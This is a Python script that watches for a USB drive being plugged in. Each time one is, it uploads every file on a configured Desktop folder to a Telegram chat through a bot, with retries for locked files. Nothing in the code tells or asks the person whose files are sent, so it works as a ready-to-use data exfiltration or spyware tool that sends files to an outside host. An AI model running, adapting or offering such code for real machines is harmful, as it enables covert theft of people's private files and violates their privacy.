import os
import asyncio
import telegram
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import psutil
import time

BOT_TOKEN = "Enter Token"
ADMIN_CHAT_ID = "Enter ID"

bot = telegram.Bot(token=BOT_TOKEN)
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

class DesktopHandler(FileSystemEventHandler):
    async def send_file(self, file_path):
        retry_count = 5
        for attempt in range(retry_count):
            try:
                if os.path.getsize(file_path) == 0:
                    print(f"File is empty, skipping: {file_path}")
                    return

                with open(file_path, 'rb') as document:
                    await bot.send_document(chat_id=ADMIN_CHAT_ID, document=document)
                    print(f"File sent: {file_path}")
                return

            except PermissionError:
                print(f"Permission denied for file: {file_path}. Retrying...")
                await asyncio.sleep(1)
            except Exception as e:
                print(f"Error sending file: {e}")
                return

async def send_desktop_files():
    path = "Desktop path"
    for filename in os.listdir(path):
        file_path = os.path.join(path, filename)
        if os.path.isfile(file_path):
            await DesktopHandler().send_file(file_path)

def find_usb_drives():
    drives = []
    partitions = psutil.disk_partitions()
    for partition in partitions:
        if 'removable' in partition.opts:
            drives.append(partition.device)
    return drives

async def monitor_usb():
    previous_drives = find_usb_drives()
    print("Monitoring USB connections...")

    while True:
        current_drives = find_usb_drives()
        new_drives = [drive for drive in current_drives if drive not in previous_drives]
        
        if new_drives:
            print("New USB detected. Sending desktop files...")
            await bot.send_message(chat_id=ADMIN_CHAT_ID, text="USB connected. Sending desktop files...")
            await send_desktop_files()
        
        previous_drives = current_drives
        await asyncio.sleep(5)

if __name__ == "__main__":
    try:
        loop.run_until_complete(monitor_usb())
    except Exception as e:
        print(f"Error running the bot: {e}")
